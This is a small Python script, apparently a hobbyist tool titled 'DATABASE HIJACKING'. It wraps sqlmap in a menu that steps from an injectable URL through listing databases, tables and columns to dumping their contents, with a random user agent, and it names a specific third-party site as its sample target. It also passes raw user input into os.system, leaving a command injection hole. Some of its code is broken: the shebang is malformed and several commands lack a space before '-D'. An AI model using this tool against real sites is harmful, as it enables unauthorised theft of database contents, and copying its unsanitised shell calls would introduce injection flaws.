#!usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet DATABASE HIJACKING")
print("""
WELCOME THE  DATABASE HIJACKING TOOL
1)I only know open link
2)I know the explicit link and the database name
3)I know open link, database name and table name
4)I know the explicit link, database name, table name and column name

sample: http://www.suesupriano.com/article.php?id=25


""")

process_no=input("Enter The Process NO: ")
if(process_no=="1"):
	openlink=input("Enter Open Link: ")
	os.system("sqlmap -u " +openlink + " --dbs --random-agent")

elif(process_no=="2"):
	openlink=input("Enter Open Link: ")
	database=input("Enter Database Name: ")
	os.system("sqlmap -u " +openlink + "-D " + database + " --tables --random-agent")

elif(process_no=="3"):
	openlink=input("Enter Open Link: ")
	database=input("Enter Database Name: ")
	table=input("Enter Table Name: ")
	os.system("sqlmap -u " +openlink + "-D " + database + " -T " + table + " --columns --random-agent")
	
elif(process_no=="4"):
	openlink=input("Enter Open Link: ")
	database=input("Enter Database Name: ")
	table=input("Enter Table Name: ")
	column=input("Enter The Column Name: ")
	os.system("sqlmap -u " +openlink + "-D " + database + " -T " + table + " -C " + column + " --dump --random-agent")
	
else:
	print("Invalid Process NO")
